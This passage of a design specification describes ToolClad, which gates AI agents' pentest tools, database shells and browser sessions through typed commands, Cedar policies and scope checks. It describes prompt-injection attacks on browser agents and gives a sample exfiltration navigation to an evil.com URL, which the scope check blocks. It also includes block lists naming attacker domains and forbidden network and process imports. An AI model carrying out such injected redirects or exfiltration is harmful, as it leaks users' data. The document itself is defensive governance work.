| `msfconsole_session.set_target` | "Set the target" | `{ "command": "set RHOSTS 10.0.1.5" }` |
| `msfconsole_session.run` | "Execute the loaded module" | `{ "command": "run" }` |

The LLM never sees a free-text input field. It picks from typed operations. The parameter is validated against the command's `pattern` regex, scope-checked if `extract_target = true`, and policy-gated at the command's declared `risk_tier`. A command that does not match any declared pattern is rejected before it reaches the PTY.

#### Prompt-Based State Inference

The `ready_pattern` regex tells the SessionExecutor when the tool is waiting for input. But different prompts reveal different internal states:

| Prompt | Inferred State |
|---|---|
| `msf6 >` | `ready` (no module loaded) |
| `msf6 exploit(ms17_010) >` | `module_loaded` |
| `msf6 exploit(ms17_010) > [*] ...` | `running` |
| `dbname=>` | `ready` (psql, connected) |
| `dbname=#` | `ready` (psql, superuser, higher risk tier) |

The executor parses prompt changes and reports `session_state` in the output schema. Cedar policies can reference session state for authorization decisions:

```cedar
// Only allow "run" when module is configured
permit (
    principal == PenTest::Phase::"exploit",
    action == PenTest::Action::"execute_tool",
    resource
)
when {
    resource.tool_name == "msfconsole_session.run" &&
    resource.session_state == "configured"
};
```

This means Cedar governs not just *what* the agent can do, but *when* in the session it can do it. State-aware, interaction-count-aware, time-aware governance on an interactive tool, all evaluated outside LLM influence.

#### SessionExecutor Architecture

The SessionExecutor manages the tool process via a PTY (pseudo-terminal):

```
Agent ORGA Loop              SessionExecutor                Tool Process (PTY)
     |                            |                              |
     |  propose command           |                              |
     |--------------------------->|                              |
     |                            |  validate against pattern    |
     |                            |  check scope (if extract)    |
     |                            |  Cedar policy evaluation     |
     |                            |                              |
     |                     [if allowed]                          |
     |                            |  write to PTY stdin          |
     |                            |----------------------------->|
     |                            |                              |
     |                            |  read until ready_pattern    |
     |                            |<-----------------------------|
     |                            |                              |
     |                            |  parse prompt -> state       |
     |                            |  frame output                |
     |                            |  validate against schema     |
     |                            |  wrap in evidence envelope   |
     |                            |                              |
     |  {prompt, output, state}   |                              |
     |<---------------------------|                              |
     |                            |                              |
  [next ORGA iteration]
```

The SessionExecutor handles:

- **PTY allocation and management**: Spawns the tool in a pseudo-terminal, handles SIGWINCH, manages process lifecycle
- **Prompt detection**: Watches stdout for `ready_pattern` matches to know when the tool is waiting for input vs. still producing output
- **Output framing**: Extracts the meaningful output between the sent command and the next prompt, stripping echoed input and ANSI escape codes
- **State inference**: Parses prompt changes to update `session_state`
- **Timeout enforcement**: Kills the session if `idle_timeout`, `session_timeout`, or `max_interactions` are exceeded
- **Evidence capture**: Logs the full session transcript with timestamps, command/response pairs, and policy decisions for the cryptographic audit trail

#### Session Lifecycle

```
spawn -> startup -> ready -> interact -> ... -> terminate
  |                   |         |                    |
  |  startup_command  |  agent  |  idle_timeout      |
  |  wait for         |  sends  |  session_timeout   |
  |  ready_pattern    |  cmds   |  max_interactions  |
  |                   |         |  explicit close     |
  |  startup_timeout  |         |  agent terminates   |
  |  exceeded? FAIL   |         |                    |
```

Sessions are scoped to a single agent ORGA loop. When the loop completes (task done, timeout, or error), the SessionExecutor terminates the process and finalizes the evidence transcript. Sessions do not persist across agent restarts. This is deliberate: a session is an ephemeral execution context, not durable state.

#### CLI Session Applications

Session mode applies to any interactive tool where governance matters:

| Tool | Session Commands | Governance Value |
|---|---|---|
| `psql` / `mysql` | `select_query`, `insert`, `update`, `create_table`, `drop_table` | Read-only agents cannot mutate. DDL requires human approval. |
| `redis-cli` | `get`, `set`, `del`, `keys`, `flushdb` | Agents can read/write keys but `flushdb` requires approval. |
| `kubectl exec` | `get`, `describe`, `logs`, `delete`, `apply` | Agents can inspect but destructive operations are gated. |
| `gdb` / `lldb` | `info`, `backtrace`, `print`, `set`, `continue`, `kill` | Agents can inspect state but `set` and `kill` are gated. |
| `aws` / `gcloud` | Subcommand-specific patterns | Read operations allowed, write/delete operations gated by resource type. |
| `python3` / `node` | REPL commands with import restrictions | Agent can compute but cannot import `os`, `subprocess`, `socket`. |

---

### Browser Mode

Browser mode manages browser sessions through direct CDP (Chrome DevTools Protocol) WebSocket connections. The governance model is identical to CLI session mode: typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture. The transport is a browser engine instead of a PTY.

The BrowserExecutor connects directly to Chrome's remote debugging WebSocket with no intermediary framework. On first access to a tab, a lightweight background daemon holds the session open and auto-exits after idle timeout. This approach (inspired by [chrome-cdp](https://github.com/pasky/chrome-cdp-skill)) handles 100+ open tabs reliably where Puppeteer-based tools often time out during target enumeration.

Two connection modes are supported:

- **`connect = "launch"`**: Spawn a new headless browser instance. Used for automated testing, scraping, and sandboxed workflows. The executor owns the browser lifecycle.
- **`connect = "live"`**: Attach to the user's running Chrome session via its debug port. Used for personal assistants and development workflows. The agent can interact with tabs the user already has open, including logged-in sessions. The executor does not own the browser lifecycle.

Playwright is available as an optional convenience layer (`engine = "playwright"`) for teams that prefer its higher-level API, but CDP-direct is the recommended default for lower overhead and live browser support.

#### Why Browser Agents Need Structural Governance

Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based automation) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. A single prompt injection on a visited page can redirect the agent to an attacker-controlled domain, exfiltrate form data, or execute malicious scripts.

ToolClad browser mode makes navigation, interaction, and execution structurally governed:

- **URL scope enforcement**: Navigation targets are validated against an allow-list of domains before the CDP command fires. The agent cannot navigate outside scope regardless of what the LLM proposes.
- **Command-level risk tiering**: Reading page content is low risk. Clicking a link is low risk. Submitting a form is high risk. Executing JavaScript is high risk and requires human approval. Each action is a separate typed command with its own Cedar policy.
- **Page state as policy context**: Cedar policies can reference the current URL, domain, authentication status, and form presence. Rules like "block form submission on authenticated pages without human approval" are expressible.

#### Browser Manifest

```toml
# tools/browser.clad.toml
[tool]
name = "browser_session"
mode = "browser"
description = "Governed browser session with CDP-direct connection"
risk_tier = "medium"

[tool.cedar]
resource = "Web::BrowserSession"
action = "browse"

[tool.evidence]
output_dir = "{evidence_dir}/{session_id}-browser"
capture = true
hash = "sha256"
screenshots = true

# --- Browser Lifecycle ---

[browser]
engine = "cdp-direct"                      # direct CDP WebSocket, no Playwright overhead
connect = "launch"                         # "launch" = spawn headless, "live" = attach to running Chrome
headless = true                            # ignored when connect = "live"
startup_timeout_seconds = 10
session_timeout_seconds = 600
idle_timeout_seconds = 120
max_interactions = 200

# Default extraction mode: accessibility tree is compact and semantic,
# far better for LLM consumption than raw HTML
[browser.defaults]
extract_mode = "accessibility_tree"        # "accessibility_tree" | "html" | "text"

# Scope enforcement on navigation
[browser.scope]
allowed_domains = ["*.example.com", "docs.example.com"]
blocked_domains = ["*.evil.com", "admin.*"]
allow_external = false

# --- Browser Commands ---

[browser.commands.list_tabs]
description = "List open browser tabs with titles and URLs"
risk_tier = "low"

[browser.commands.navigate]
description = "Navigate a tab to a URL"
risk_tier = "medium"
args.url = { type = "url", schemes = ["https"], scope_check = true }

[browser.commands.snapshot]
description = "Get accessibility tree snapshot of the current page (compact, semantic)"
risk_tier = "low"
args.selector = { type = "string", required = false, description = "Optional CSS selector to scope the snapshot" }

[browser.commands.extract_html]
description = "Get raw HTML scoped to a CSS selector"
risk_tier = "low"
args.selector = { type = "string", required = true }

[browser.commands.click]
description = "Click an element by CSS selector"
risk_tier = "low"
args.selector = { type = "string", pattern = "^[a-zA-Z0-9_.#\\[\\]=\"' >:()-]+$" }

[browser.commands.type_text]
description = "Type text into the focused element (works in cross-origin iframes)"
risk_tier = "low"
args.text = { type = "string", sanitize = ["injection"] }

[browser.commands.submit_form]
description = "Submit a form"
risk_tier = "high"
human_approval = true
args.selector = { type = "string" }

[browser.commands.screenshot]
description = "Capture page screenshot for evidence"
risk_tier = "low"

[browser.commands.network_timing]
description = "Get network resource timing data for the current page"
risk_tier = "low"

[browser.commands.execute_js]
description = "Evaluate JavaScript in page context"
risk_tier = "high"
human_approval = true
args.expression = { type = "string" }

[browser.commands.wait_for]
description = "Wait for an element to appear"
risk_tier = "low"
args.selector = { type = "string" }
args.timeout_ms = { type = "integer", min = 100, max = 30000, default = 5000 }

[browser.commands.go_back]
description = "Navigate back in browser history"
risk_tier = "low"

# --- State Inference ---

[browser.state]
fields = ["url", "title", "domain", "has_forms", "is_authenticated", "page_loaded", "tab_count"]

# --- Output Schema ---

[output.schema]
type = "object"

[output.schema.properties.url]
type = "string"
description = "Current page URL after command"

[output.schema.properties.title]
type = "string"
description = "Current page title"

[output.schema.properties.domain]
type = "string"
description = "Current page domain (for policy context)"

[output.schema.properties.content]
type = "string"
description = "Accessibility tree snapshot, extracted HTML, or command result"

[output.schema.properties.screenshot_path]
type = "string"
description = "Path to screenshot evidence if captured"

[output.schema.properties.page_state]
type = "object"
description = "Inferred page state for Cedar policy context"

[output.schema.properties.page_state.properties.has_forms]
type = "boolean"

[output.schema.properties.page_state.properties.is_authenticated]
type = "boolean"

[output.schema.properties.page_state.properties.page_loaded]
type = "boolean"

[output.schema.properties.interaction_count]
type = "integer"
```

**Live browser manifest variant** for attaching to a running Chrome session:

```toml
# tools/chrome_live.clad.toml
[tool]
name = "chrome_live"
mode = "browser"
description = "Governed access to live Chrome session"
risk_tier = "medium"

[tool.cedar]
resource = "Web::BrowserSession"
action = "browse"

[browser]
engine = "cdp-direct"
connect = "live"                           # attach to running Chrome, don't launch
headless = false                           # this IS the user's live browser
idle_timeout_seconds = 1200                # 20 min, matches chrome-cdp daemon behavior

[browser.defaults]
extract_mode = "accessibility_tree"

[browser.scope]
allowed_domains = ["github.com", "*.internal.corp.com"]
blocked_domains = ["*.evil.com"]
allow_external = false

# Same commands as the headless variant, same governance
# (commands section identical, omitted for brevity)
```

#### Per-Interaction ORGA Gating (Browser)

The ORGA loop works identically to CLI session mode. The transport differs; the governance is the same:

```
Iteration 1:
  Observe:  {url: "https://app.example.com/login", title: "Login", has_forms: true}
  Reason:   LLM proposes browser_session.type_text(selector="#email", text="user@co.com")
  Gate:     Cedar: is type_text allowed? ToolClad: selector matches pattern, text is injection-safe
  Act:      BrowserExecutor sends CDP command, waits for page stable

Iteration 2:
  Observe:  {url: "https://app.example.com/login", title: "Login"}
  Reason:   LLM proposes browser_session.submit_form(selector="#login-form")
  Gate:     Cedar: submit_form requires human_approval -> PENDING
  Act:      (blocked until human approves)

Iteration 3:
  Observe:  {url: "https://app.example.com/dashboard", is_authenticated: true}
  Reason:   LLM proposes browser_session.navigate(url="https://evil.com/exfil?data=...")
  Gate:     ToolClad: URL scope check -> DENY (domain not in allowed_domains)
  Act:      (blocked, denial fed back to agent)
```

#### BrowserExecutor Architecture

The BrowserExecutor connects directly to Chrome's remote debugging WebSocket. No Puppeteer, no intermediary framework. On first access to a tab, a lightweight daemon is spawned that holds the CDP session open. Chrome's "Allow debugging" modal fires once; subsequent commands reuse the daemon. Daemons auto-exit after idle timeout.

```
Agent ORGA Loop              BrowserExecutor               Chrome (CDP WebSocket)
     |                            |                              |
     |  propose command           |                              |
     |--------------------------->|                              |
     |                            |  validate against command    |
     |                            |  check URL scope (if nav)    |
     |                            |  Cedar policy evaluation     |
     |                            |                              |
     |                     [if allowed]                          |
     |                            |  send CDP command via WS     |
     |                            |----------------------------->|
     |                            |                              |
     |                            |  wait: page load + idle      |
     |                            |<-----------------------------|
     |                            |                              |
     |                            |  capture: URL, title, a11y   |
     |                            |  infer page state            |
     |                            |  screenshot (if configured)  |
     |                            |  validate against schema     |
     |                            |  wrap in evidence envelope   |
     |                            |                              |
     |  {url, title, content,     |                              |
     |   page_state, screenshot}  |                              |
     |<---------------------------|                              |
     |                            |                              |
  [next ORGA iteration]
```

The BrowserExecutor handles:

- **CDP connection management**: Direct WebSocket to Chrome's debug port. Persistent daemon per tab that survives across interactions. No reconnection overhead per command.
- **Live browser attachment**: When `connect = "live"`, discovers tabs via `http://localhost:9222/json` (Chrome's debug endpoint), attaches to existing tabs without disrupting the user's session.
- **Ready detection**: Waits for page load event + network idle (configurable) instead of prompt regex matching
- **Accessibility tree extraction**: Default content extraction uses Chrome's accessibility tree (`Accessibility.getFullAXTree` CDP method), returning a compact semantic representation instead of raw HTML. This is dramatically more token-efficient for LLM consumption.
- **State inference**: Inspects URL, DOM (form presence, auth indicators like session cookies or user profile elements), and page title to populate `page_state` for Cedar policy context
- **Screenshot evidence**: Captures page screenshots at each interaction for the audit trail
- **Scope enforcement**: Intercepts all navigation (including redirects and link clicks) and validates target URLs against `[browser.scope]`
- **Tab management**: `list_tabs` enumerates available targets. When `connect = "live"`, this shows the user's actual open tabs. The agent can switch between tabs, each maintaining its own scope context.

#### Cedar Policy Examples (Browser)

```cedar
// Allow navigation only to allowed domains
permit (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "navigate" &&
    resource.url_domain in Web::DomainSet::"allowed"
};

// Block form submission on authenticated pages without human approval
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "submit_form" &&
    resource.page_state.is_authenticated == true
}
unless {
    resource.human_approved == true
};

// Block all JavaScript execution unless explicitly approved
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "execute_js"
}
unless {
    resource.human_approved == true
};

// Rate limit: max 5 form submissions per session
forbid (
    principal,
    action == Web::Action::"browse",
    resource
)
when {
    resource.command == "submit_form" &&
    resource.session_submit_count >= 5
};
```

#### Browser-Specific Scope Enforcement

URL scope checking is the browser equivalent of target scope checking on CLI tools like `nmap`. It operates at three levels:

1. **Navigation commands**: The `navigate` command's URL is validated against `[browser.scope]` before the CDP command fires.
2. **Redirect interception**: The BrowserExecutor intercepts HTTP redirects and validates each hop. A page at `allowed.example.com` that redirects to `evil.com` is blocked mid-redirect.
3. **Link click validation**: When the agent uses `click` on a link, the executor resolves the `href` and validates before allowing the navigation.

The `allow_external = false` setting is the strictest mode: the browser cannot leave the declared domain set under any circumstances. Setting `allow_external = true` allows navigation to unlisted domains but still blocks `blocked_domains`.

#### Browser Mode Applications

| Use Case | Connect Mode | Commands Used | Governance Value |
|---|---|---|---|
| Web application testing | `launch` | navigate, click, type_text, submit_form, snapshot | Scope-locked to test environment. Form submission gated. |
| Competitive intelligence | `launch` | navigate, snapshot, screenshot | Read-only. No form submission, no JS execution. |
| Form filling / workflow automation | `launch` | navigate, type_text, submit_form, snapshot | Human approval on submission. Scope-locked to target app. |
| Web scraping | `launch` | navigate, snapshot, click | Read-only. Rate-limited. Domain-locked. |
| Developer assistant (live browser) | `live` | list_tabs, snapshot, extract_html, screenshot | Read-only access to user's logged-in sessions. No mutation. |
| Internal tool automation | `live` | navigate, click, type_text, submit_form, snapshot | Agent operates in user's authenticated context. Scope-locked to internal domains. |
| Debugging / monitoring | `live` | snapshot, network_timing, screenshot | Read-only inspection of live page state and performance. |

---

### Nested Sessions (Architectural Specification)

When a session-mode tool spawns a child interactive context (msfconsole opens a meterpreter shell, `kubectl exec` opens a remote shell, a browser opens a popup), the parent session detects it and registers a dynamic child session. This is not recursive PTY management. Child sessions are new tools that get dynamically registered with their own contracts.

**Detection:** The parent SessionExecutor detects child session creation through output parsing. A msfconsole `run` command that produces "Meterpreter session 1 opened" triggers child registration. A browser popup triggers a new page context. The detection patterns are declared in the parent manifest:

```toml
[session.child_detection]
pattern = "session (\\d+) opened"
type = "meterpreter"
manifest = "tools/meterpreter.clad.toml"    # child session contract
```

**Registration:** The child session gets:

- A session ID derived from the parent (`parent_session_id.child_1`)
- Its own `[session.commands]` from its own manifest (meterpreter commands differ from msfconsole commands)
- Its own Cedar policy context (post-exploitation policies, not exploitation policies)
- Its own evidence stream, linked to the parent's evidence chain

**Agent interaction:** The agent interacts with child sessions through scoped MCP tools: `msfconsole_session.child.sysinfo`, `msfconsole_session.child.download`. The parent SessionExecutor routes commands to the correct child PTY. Each child interaction goes through Cedar gating independently with the child's policy context.

**Policy inheritance:** Child sessions inherit the parent's scope constraints (target IPs, allowed domains) but can have more restrictive policies. A child session can never be less restricted than its parent. Cedar policy evaluation checks both the child's policies and the parent's scope.

**Evidence chain:** The child session transcript is linked to the parent via `parent_session_id`. The evidence chain records: parent session started, parent command triggered child, child session registered, child interactions (each with Cedar decisions), child terminated, parent continued. This provides a complete audit trail across session boundaries.

**v1 scope:** The architecture is specified. Implementation in v1 supports single-level nesting (parent spawns child). Recursive nesting (child spawns grandchild) is deferred.

---

### Unsolicited Output (Architectural Specification)

Session and browser mode tools can produce output without being prompted: log lines during long operations, async alerts, incoming data on monitored connections, server push events. The architecture extends the Observe phase with an event queue.

**Event queue:** Each active session maintains a bounded event queue. The executor polls the PTY/CDP for output between interactions. Output that appears without a corresponding command (no prompt match expected, no request pending) is framed as an event:

```json
{
  "event_type": "log_line",
  "timestamp": "2026-03-21T12:34:56Z",
  "session_id": "a1b2c3d4",
  "content": "[*] Meterpreter session 1 opened (10.0.1.5:4444 -> 10.0.1.100:49152)",
  "source": "stdout"
}
```

**Manifest declaration:** Session manifests declare which event types are expected and how the queue behaves:

```toml
[session.events]
enabled = true
max_queue_depth = 100
poll_interval_ms = 500
event_types = ["log_line", "session_opened", "alert", "error"]
ttl_seconds = 300                        # events older than this are dropped
```

**Observe phase integration:** The agent's ORGA Observe phase drains the event queue alongside normal tool results. Events are presented as additional observations with their types and timestamps. The agent can reason about events in the same way it reasons about tool outputs.

**Cedar policy on events:** Cedar policies can filter which event types reach the agent. Noisy events (debug log lines) can be suppressed. Critical events (session opened, alert) can trigger escalation or priority reordering:

```cedar
// Only surface session_opened and alert events to the agent
permit (
    principal,
    action == Session::Action::"receive_event",
    resource
)
when {
    resource.event_type in ["session_opened", "alert"]
};
```

**Browser events:** The BrowserExecutor uses the same event queue for page-level events: console errors, network failures, navigation redirects, dialog appearances. These are detected via CDP event listeners rather than PTY polling.

**v1 scope:** Event queue implementation with bounded depth, TTL, and Cedar filtering. Basic event types for session and browser modes. Advanced event routing (event-triggered ORGA loops, priority interrupts) deferred.

---

### Browser Authentication Flows (Architectural Specification)

Browser agents frequently need to authenticate with web services. Credentials must be injected by the executor, never visible to the LLM. The architecture separates the agent's intent ("log in to GitHub") from the executor's mechanics (fill credentials from Vault, submit form, verify success).

**Auth flow declaration:** The browser manifest declares named authentication flows:

```toml
[browser.auth_flows.github]
login_url = "https://github.com/login"
username_selector = "#login_field"
password_selector = "#password"
submit_selector = "[name='commit']"
success_indicator = "url_contains=/dashboard"
secret_ref = "vault:github/web-credentials"
mfa_handler = "totp"                      # optional: totp, sms, or manual
mfa_selector = "#otp"                     # where to enter the TOTP code
mfa_secret_ref = "vault:github/totp-seed" # TOTP seed from Vault
```

**Agent interaction:** The agent proposes `browser_session.login(service="github")`. The BrowserExecutor:

1. Looks up the "github" auth flow in the manifest
2. Navigates to `login_url`
3. Retrieves credentials from Vault/OpenBao via `secret_ref`
4. Fills username and password fields using CDP directly (not through the LLM)
5. Submits the form
6. If MFA is required and `mfa_handler = "totp"`, retrieves the TOTP seed from Vault, generates the current code, and fills the MFA field
7. If MFA requires human intervention (`mfa_handler = "manual"`), pauses and waits for human input
8. Validates success via `success_indicator` (URL check, element presence, cookie check)
9. Returns `{authenticated: true, service: "github"}` to the agent

The LLM never sees credentials, TOTP seeds, or session tokens. It proposes the high-level action; the executor handles the mechanics.

**Cedar policy:** Auth flows are gated by Cedar. Not every agent can log in to every service:

```cedar
permit (
    principal == Agent::"data-collector",
    action == Web::Action::"authenticate",
    resource
)
when {
    resource.service == "github" &&
    resource.access_level == "read-only"
};
```

**Session persistence:** After successful authentication, the browser session maintains cookies and local storage for the session's lifetime. The BrowserExecutor can optionally persist browser profiles to encrypted storage for reuse across sessions (configured per auth flow, requires Cedar authorization).

**v1 scope:** Auth flow declaration, Vault credential injection, TOTP support, success validation. OAuth redirect flows (where the browser must follow a redirect chain through a third-party IdP) deferred to v2.

---

### Out of Scope by Design

**TUI tools** (`htop`, `lazygit`, `vim`): Full-screen terminal UIs require cursor positioning, screen buffer tracking, and visual layout interpretation. This is a fundamentally different problem from behavioral contracts. ToolClad is the wrong abstraction for TUI tools. The agentic equivalent of a TUI tool is a set of oneshot manifests that expose the same underlying data programmatically: `ps aux` instead of `htop`, `git` subcommand manifests instead of `lazygit`, file-manipulation tools instead of `vim`. If an agent needs the information a TUI tool displays, wrap the underlying data source in a oneshot or session manifest.

**Coordinate-based browser interaction** (`clickxy`, pixel-coordinate clicking, visual element targeting): ToolClad browser commands operate on CSS selectors, which are semantic and validatable. Coordinate-based clicking depends on viewport size, zoom level, and visual layout, making it non-deterministic and ungovernable through typed contracts. This is computer-use / visual automation territory (e.g., Anthropic's computer use API), not a behavioral contract problem.

**Raw CDP passthrough** (`evalraw`, arbitrary CDP method invocation): Exposing raw Chrome DevTools Protocol methods to the agent bypasses all ToolClad validation. Any CDP method can modify browser state, exfiltrate data, or interact with the OS. ToolClad browser commands are the governed surface; raw CDP is the implementation detail that the BrowserExecutor uses internally but never exposes to the agent.

**Non-headless GUI automation**: Browser mode supports both headless (`connect = "launch"`) and live browser attachment (`connect = "live"`), but interaction is always through CSS selectors and typed commands via CDP. GUI-level automation (mouse movement, screen capture-based element detection, window management) is out of scope.

---

## Symbiont Integration

### Runtime Discovery

On startup, the Symbiont runtime scans the `tools/` directory for `.clad.toml` files, the same way it scans `agents/` for `.dsl` files and `policies/` for `.cedar` files:

```
project/
  agents/
    recon.dsl
    enum.dsl
  policies/
    tool-authorization.cedar
    scope.cedar
  tools/
    nmap_scan.clad.toml
    whois_lookup.clad.toml
    nuclei_scan.clad.toml
    hydra_bruteforce.clad.toml
  toolclad.toml             # Optional: project-level config, custom types
  symbiont.toml
```

The runtime:

1. Parses each `.clad.toml` file
2. Validates the manifest (required fields, type definitions, template references, output schema)
3. Registers each tool as an MCP tool with `inputSchema` derived from `[args]` and `outputSchema` derived from `[output.schema]`
4. Wires the tool to the ToolClad executor in the `ActionExecutor` pipeline

### DSL Tool Reference Resolution

DSL agents reference tools by name:

```dsl
capabilities = [
    "tool.nmap_scan",
    "tool.whois_lookup",
]
```

The runtime resolves `tool.nmap_scan` by looking up `nmap_scan` in the tool registry. Resolution order:

1. **ToolClad manifests** (`tools/nmap_scan.clad.toml`)
2. **Rust-registered tools** (legacy `register_tools()` in `src/*.rs`)
3. **MCP server tools** (from connected MCP servers in `symbiont.toml`)

ToolClad manifests take priority. This allows gradual migration: existing Rust tool definitions continue to work, and teams can convert them to manifests one at a time.

### MCP Schema Generation

The `[args]` section maps to MCP `inputSchema` and `[output.schema]` maps to MCP `outputSchema`:

```toml
# From nmap_scan.clad.toml
[args.target]
position = 1
required = true
type = "scope_target"
description = "Target CIDR, IP, or hostname"

[args.scan_type]
position = 2
required = true
type = "enum"
allowed = ["ping", "service", "version", "syn"]
description = "Type of scan to perform"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"
```

Generates:

```json
{
  "name": "nmap_scan",
  "description": "Network port scanning and service detection",
  "inputSchema": {
    "type": "object",
    "properties": {
      "target": {
        "type": "string",
        "description": "Target CIDR, IP, or hostname"
      },
      "scan_type": {
        "type": "string",
        "enum": ["ping", "service", "version", "syn"],
        "description": "Type of scan to perform"
      },
      "extra_flags": {
        "type": "string",
        "description": "Additional nmap flags (must pass Gate approval)",
        "default": ""
      }
    },
    "required": ["target", "scan_type"]
  },
  "outputSchema": {
    "type": "object",
    "properties": {
      "status": { "type": "string", "enum": ["success", "error"] },
      "scan_id": { "type": "string" },
      "tool": { "type": "string" },
      "command": { "type": "string" },
      "duration_ms": { "type": "integer" },
      "timestamp": { "type": "string", "format": "date-time" },
      "output_file": { "type": "string" },
      "output_hash": { "type": "string" },
      "results": {
        "type": "object",
        "properties": {
          "hosts": {
            "type": "array",
            "description": "Discovered hosts with open ports and services"
          }
        }
      }
    }
  }
}
```

The LLM sees both schemas in the Reason phase: `inputSchema` to know what parameters to provide, `outputSchema` to know what data it will receive back. It can reason about whether a tool's output structure is useful for its current goal *before* proposing the call. It never sees or constructs the actual nmap command.

### Cedar Policy Integration

The `[tool.cedar]` section declares the Cedar resource and action for the tool:

```toml
[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"
```

The ORGA Gate builds the Cedar authorization request from the manifest metadata plus the agent's runtime context (phase, environment, agent identity). Existing Cedar policies in `policies/tool-authorization.cedar` work unchanged because they already match on `resource.tool_name`.

**Future: automatic policy generation.** Because the manifest declares the tool's risk tier, parameter types, and Cedar resource, the runtime could generate baseline Cedar policies:

```
# Auto-generated from nmap_scan.clad.toml (risk_tier = "low")
permit (
    principal,
    action == PenTest::Action::"execute_tool",
    resource
)
when {
    resource.tool_name == "nmap_scan"
};
```

Teams then refine the generated policies (add phase restrictions, environment constraints, human approval gates).

### ORGA Loop Integration

The ToolClad executor plugs into the existing ORGA action execution pipeline:

```
Observe: Agent receives input/observations
    |
Reason:  LLM proposes tool calls using MCP schemas (generated from manifests)
    |
Gate:    Cedar evaluates policy using manifest-declared resource/action
    |     + ToolClad validates all arguments against manifest type system
    |
Act:     ToolClad executor constructs command from template, executes,
         parses output, wraps in evidence envelope
    |
Observe: Agent receives structured JSON results
```

The Gate phase now has two validation layers:

1. **Cedar policy evaluation**: Is this agent, in this phase, allowed to invoke this tool on this target? (Authorization)
2. **ToolClad argument validation**: Do all parameters satisfy their declared types, ranges, patterns, and scope constraints? (Input correctness)

Both execute outside LLM influence. Both must pass for execution to proceed.

### ActionExecutor Pipeline

The `EnforcedActionExecutor` gains a ToolClad dispatch path:

```
ProposedAction
  -> ToolInvocationEnforcer (SchemaPin verification check)
  -> Cedar policy evaluation
  -> ToolClad argument validation (if manifest exists)
  -> ToolClad command construction + execution (if manifest exists)
     OR Rust tool function (if legacy registration)
     OR MCP server forwarding (if external MCP tool)
  -> Evidence envelope wrapping
  -> Observation returned to loop
```

### Scope Enforcement

Any parameter with type `scope_target`, `url` (with `scope_check = true`), `cidr`, or `ip_address` is automatically validated against the project's scope definition (`scope/scope.toml`). This replaces the `source /app/scripts/scope-check.sh; validate_scope` pattern in every wrapper script.

The scope check runs in the executor, after Cedar authorization but before command execution. This is the defense-in-depth layer: even if a Cedar policy bug allows an out-of-scope target, the ToolClad type system catches it.

#### Cross-Language Scope Validation Consistency

Scope validation involves non-trivial logic: CIDR containment math, IPv4/IPv6 normalization, DNS wildcard suffix matching, and hostname resolution. Re-implementing this identically in Rust, Python, Go, and JavaScript creates a risk of **security drift** — an IP that passes the Python validator but fails the Rust one, or vice versa.

To mitigate this:

1. **Normative test vectors**: The `tests/scope_vectors.json` file contains a shared set of test cases (IP-in-CIDR, wildcard matching, edge cases) that all implementations MUST pass. Adding a new scope rule requires adding test vectors first.
2. **Centralization path**: For production deployments where four independent validators are unacceptable, the Symbiont runtime provides a single scope validation endpoint (gRPC/HTTP) that client-side executors call. Alternatively, a single Rust-based scope library can be compiled to WebAssembly (Wasm) for use by Python/JS/Go implementations via FFI bindings.

---

## Migration Path from symbi-redteam

The existing symbi-redteam architecture maps cleanly to ToolClad:

| Current (7 steps) | ToolClad (2-3 steps) |
|---|---|
| 1. Write `scripts/tool-wrappers/nmap-wrapper.sh` | 1. Write `tools/nmap_scan.clad.toml` |
| 2. Define `NmapScanInput`/`NmapScanOutput` in `src/recon_tools.rs` | (auto-generated from manifest) |
| 3. Implement `nmap_scan()` function | (ToolClad executor handles this) |
| 4. Register in `register_tools()` with Cedar mappings | (auto-registered from `[tool.cedar]`) |
| 5. Add capability to agent DSL | 2. Add capability to agent DSL (unchanged) |
| 6. Add Cedar policies | 3. Add Cedar policies (unchanged, or auto-generate baseline) |
| 7. Write `scripts/parse-outputs/parse-nmap-xml.py` | (optional, use `builtin:xml` or keep custom parser) |

**Backward compatibility**: Existing Rust-registered tools and wrapper scripts continue to work. The `command.executor` escape hatch lets manifests delegate to existing wrappers during migration. Teams can convert one tool at a time.

### symbi-redteam Conversion Coverage

Of the 19 existing wrapper scripts:

- **~14 are pure template tools**: nmap, whois, dns, whatweb, amass, nikto, gobuster, enum4linux, smbclient, snmpwalk, nuclei, searchsploit, chisel, ligolo. These convert to manifests with no custom executor.
- **~3 need conditional logic**: hydra (credential file vs single credential), sqlmap (detect vs exploit mode), pypykatz (different dump types). These use `[command.conditionals]`.
- **~2 need escape hatches**: metasploit (session detection, module validation, msfconsole -x construction), impacket (multiple sub-tools). These use `command.executor` pointing to simplified wrappers that only handle command construction (validation, timeout, evidence are handled by ToolClad).

---

## Open Protocol Scope

### What is the open spec (MIT)

- The `.clad.toml` manifest format (oneshot, session, and browser modes)
- The type system and validation semantics
- The command template syntax (`[command]`)
- The HTTP request syntax (`[http]`)
- The MCP proxy syntax (`[mcp]`) with field mapping
- The session command declaration format (`[session.commands]`)
- The browser command declaration format (`[browser.commands]`)
- The browser scope declaration format (`[browser.scope]`)
- The browser auth flow declaration format (`[browser.auth_flows]`)
- The nested session detection and child manifest reference format
- The event queue declaration format (`[session.events]`)
- The secrets reference syntax (`{_secret:name}`)
- The output envelope schema (oneshot and per-interaction)
- The output schema declaration (`[output.schema]`)
- The evidence metadata format
- A reference validator (checks manifest correctness)

### What is the Symbiont implementation (Apache 2.0)

- The universal executor (Rust, integrated with tokio async runtime)
- The HTTP executor (reqwest-based, with secrets injection from Vault/OpenBao)
- The MCP proxy executor (forwards to MCP servers with field mapping and stricter validation)
- The SessionExecutor (PTY management, prompt detection, state inference, child session registration)
- The BrowserExecutor (CDP-direct WebSocket, persistent daemon per tab, live browser attachment, accessibility tree extraction, page state inference, redirect interception, auth flow execution)
- Cedar policy integration and automatic policy generation
- ORGA Gate integration (two-layer validation for oneshot, per-interaction gating for sessions and browser)
- Session/page state and event types as Cedar policy context
- Event queue with Cedar-based event filtering
- URL scope enforcement with redirect interception (browser mode)
- Target scope enforcement against `scope.toml` (oneshot and session modes)
